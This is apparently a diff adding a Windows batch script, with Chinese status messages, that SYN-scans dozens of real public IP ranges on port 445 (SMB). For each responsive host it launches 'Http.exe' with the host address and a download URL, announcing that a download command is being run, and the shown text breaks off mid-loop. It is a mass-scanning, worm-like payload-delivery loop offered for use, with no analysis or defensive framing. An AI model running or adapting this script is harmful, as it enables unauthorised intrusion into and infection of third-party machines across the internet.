+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 125.77.0.0 125.77.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 125.89.0.0 125.89.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 137.175.0.0 137.175.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 142.4.0.0 142.4.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 142.54.0.0 142.54.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 162.221.0.0 162.221.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 173.208.0.0 173.208.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 173.224.0.0 173.224.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 173.231.0.0 173.231.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 174.128.0.0 174.128.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 174.139.0.0 174.139.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 180.131.0.0 180.131.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 180.97.0.0 180.97.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 182.100.0.0 182.100.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 182.16.0.0 182.16.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 182.237.0.0 182.237.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 182.254.0.0 182.254.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 182.92.0.0 182.92.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 183.136.0.0 183.136.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 192.126.0.0 192.126.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 192.151.0.0 192.151.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 192.187.0.0 192.187.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 192.69.0.0 192.69.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 198.148.0.0 198.148.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 198.177.0.0 198.177.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 198.2.0.0 198.2.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 198.252.0.0 198.252.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 199.119.0.0 199.119.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 202.102.0.0 202.102.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 202.109.0.0 202.109.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 202.96.0.0 202.96.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 202.97.0.0 202.97.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 203.171.0.0 203.171.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 203.191.0.0 203.191.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 210.209.0.0 210.209.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 210.51.0.0 210.51.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 211.152.0.0 211.152.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 211.168.0.0 211.168.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 211.20.0.0 211.20.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 216.244.0.0 216.244.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 216.83.0.0 216.83.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 218.241.0.0 218.241.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 218.25.0.0 218.25.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 218.5.0.0 218.5.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 218.61.0.0 218.61.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 218.75.0.0 218.75.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 219.129.0.0 219.129.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 219.234.0.0 219.234.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 220.167.0.0 220.167.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 220.231.0.0 220.231.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 221.144.0.0 221.144.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 221.229.0.0 221.229.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 221.231.0.0 221.231.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 221.234.0.0 221.234.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 221.238.0.0 221.238.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 222.122.0.0 222.122.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 222.173.0.0 222.173.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 222.187.0.0 222.187.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 222.214.0.0 222.214.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
